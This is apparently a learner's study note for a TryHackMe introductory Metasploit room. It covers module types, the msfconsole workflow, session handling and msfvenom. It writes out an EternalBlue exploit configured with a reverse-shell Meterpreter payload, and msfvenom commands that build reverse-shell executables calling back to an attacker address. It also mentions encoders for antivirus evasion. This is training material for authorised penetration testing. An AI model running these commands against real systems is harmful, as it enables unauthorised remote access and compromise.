---
tags: [THM, cyber-security-101, exploitation, Metasploit, room]
platform: TryHackMe
type: room
module: "07 - Exploitation Basics"
module_number: 7
room_number: 26
status: "⬜"
url: https://tryhackme.com/room/metasploitintro
difficulty: Easy
---

# 🟦 Metasploit: Introduction

> [!abstract] Summary
> Introduction to the Metasploit Framework — the world's most-used penetration testing platform. Learn its architecture, msfconsole commands, and how to configure exploit modules.

**Path:** [[Cyber Security 101]] > Module 7 > Metasploit Introduction

## 🎯 Learning Objectives
- Navigate msfconsole
- Understand module types (exploit, auxiliary, payload, post)
- Search, configure, and run modules
- Generate payloads with msfvenom

## 📖 Key Concepts

### Module Types
```
Exploits    — code that takes advantage of vulnerabilities
Payloads    — code that runs after exploitation
Auxiliaries — scanners/fuzzers (no payload)
Post        — post-exploitation modules
Encoders    — obfuscate payloads (AV evasion)
```

### Core Workflow
```bash
msfconsole
search ms17_010             # Find modules
use exploit/windows/smb/ms17_010_eternalblue
show options                # Required settings
set RHOSTS 10.10.10.1
set LHOST 10.10.14.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check                       # Test if target is vulnerable
exploit                     # Launch
```

### Session Management
```bash
sessions -l                 # List sessions
sessions -i 1               # Interact with session 1
background                  # Background current (Ctrl+Z)
sessions -u 1               # Upgrade shell → Meterpreter
```

### msfvenom — Standalone Payloads
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o payload
```

### Payload Naming
`platform/arch/type/connection`
- `windows/x64/meterpreter/reverse_tcp` — staged Meterpreter
- `windows/x64/shell_reverse_tcp` — basic shell

> [!warning] Most AV/EDR products detect default Metasploit payloads. Only for authorised testing. Never use on systems you don't own.

## 🔑 Key Takeaways
- `search → use → set → run` is the core workflow
- Always verify `show options` — missing LHOST is the most common mistake
- Meterpreter is the most capable payload for post-exploitation
- `multi/handler` catches any reverse shell (not just Metasploit ones)

## 🔗 Related Notes
- [[CS101-27 - Metasploit Exploitation]] · [[CS101-28 - Metasploit Meterpreter]]
- [[Metasploit]] · [[Payloads]] · [[Meterpreter]] · [[msfvenom]]
